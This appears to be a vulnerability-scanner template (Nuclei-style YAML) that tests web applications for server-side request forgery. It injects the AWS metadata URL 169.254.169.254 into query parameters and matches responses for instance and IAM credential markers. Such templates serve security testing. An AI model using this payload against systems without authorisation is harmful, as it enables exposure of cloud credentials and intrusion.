id: SSRF-AWS
info:
  author: 25
  name: SSRF to AWS Metadata Service
  severity: high
requests:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    type: word
    words:
    - compute.internal
    - instance-id
    - iam-role
    - availability-zone
    - instance-type
    - identity-credentials
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    injection:
    - http://169.254.169.254/latest/meta-data/
  stop-at-first-match: true
  timeout: 10
